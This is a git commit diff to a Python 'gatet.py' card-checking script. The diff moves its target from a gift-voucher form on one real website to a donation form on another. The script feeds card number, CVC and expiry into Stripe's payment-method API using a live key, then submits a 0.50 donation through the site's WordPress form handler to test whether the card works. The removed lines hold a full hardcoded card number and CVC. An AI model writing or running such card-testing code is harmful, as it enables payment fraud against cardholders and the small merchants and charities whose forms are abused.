41e603b95998e40eb52aa64de242ada6e19eb371
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-04-19 06:32:42 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,26 +26,35 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = 'type=card&card[number]=5284973003220104&card[cvc]=642&card[exp_month]=06&card[exp_year]=25&payment_user_agent=stripe.js%2F560413f346%3B+stripe-js-v3%2F560413f346%3B+card-element&key=pk_live_51NwltJAVtXstrQNhoFxJFcNdvOONIMSspdLDZrDkgWCJ1CGGgzljDyJZQ64YPDZFmx7G2QB4OB0mkNMproXHDpsC00mfjRUHNy'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fe9b153e2b2%3B+stripe-js-v3%2Fe9b153e2b2%3B+card-element&key=pk_live_51Q6NmKCRrC0jkoUKiwulfVNT9VFfrS7QE7EBCVPyJp4G40TZ8MgGCJmEqa0zzB3eDhOa1isyZwakmOUne1NctGFt00yvLRhLLK'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '4544600f-4262-4605-a211-890d6dd95f25f11ff9',
-	    'mphb_session': 'f7c81c1d0ec4c977a6fb18da238ae595%7C%7C1744968092%7C%7C1744967732',
-	    '__stripe_sid': 'bdf4e3b0-b9d3-4813-be89-28cd4d1a91b67fc797',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_first_add': 'fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
+	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F',
+	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
+	    '__stripe_mid': '5f98cdfe-7a21-4631-a635-a6791ee0430f2cf82d',
+	    '__stripe_sid': 'fa198bca-97fc-40bf-9514-4f312b00f83dfd8cc0',
 	}
 	
 	headers = {
-	    'authority': 'thehideawaypods.co.uk',
+	    'authority': 'gracefulcamel.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=4544600f-4262-4605-a211-890d6dd95f25f11ff9; mphb_session=f7c81c1d0ec4c977a6fb18da238ae595%7C%7C1744968092%7C%7C1744967732; __stripe_sid=bdf4e3b0-b9d3-4813-be89-28cd4d1a91b67fc797',
-	    'origin': 'https://thehideawaypods.co.uk',
-	    'referer': 'https://thehideawaypods.co.uk/gift-vouchers/',
+	    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-04-18%2023%3A18%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgracefulcamel.com%2Ftreasures-collective%2Fdonate%2F; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; __stripe_mid=5f98cdfe-7a21-4631-a635-a6791ee0430f2cf82d; __stripe_sid=fa198bca-97fc-40bf-9514-4f312b00f83dfd8cc0',
+	    'origin': 'https://gracefulcamel.com',
+	    'referer': 'https://gracefulcamel.com/treasures-collective/donate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -57,13 +66,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1744966378511',
+	    't': '1745018384061',
 	}
 	
-	data = 'data=__fluent_form_embded_post_id%3D1430%26_fluentform_4_fluentformnonce%3Ded90cc54c8%26_wp_http_referer%3D%252Fgift-vouchers%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26input_text%3DAdmin%26custom-payment-amount%3D0.30%26payment_input%255B%255D%3DSend%2520me%2520an%2520e-Voucher%2520(Free!)%26hidden_1%3D-04-25%26hidden%3DYCV18143004-%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=4'
+	data = {
+	    'data': 'item_5__fluent_sf=&__fluent_form_embded_post_id=337&_fluentform_5_fluentformnonce=8052a41ca7&_wp_http_referer=%2Ftreasures-collective%2Fdonate%2F&names%5Bfirst_name%5D=&names%5Bmiddle_name%5D=&names%5Blast_name%5D=&input_text_2=&donation_email=rodamuser08%40gmail.com&address1%5Baddress_line_1%5D=&address1%5Baddress_line_2%5D=&address1%5Bcity%5D=&address1%5Bstate%5D=&address1%5Bzip%5D=&address1%5Bcountry%5D=&fluent_donation_amount=0.50&donate_payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'action': 'fluentform_submit',
+	    'form_id': '5',
+	}
 	
 	r2 = requests.post(
-	    'https://thehideawaypods.co.uk/wp-admin/admin-ajax.php',
+	    'https://gracefulcamel.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
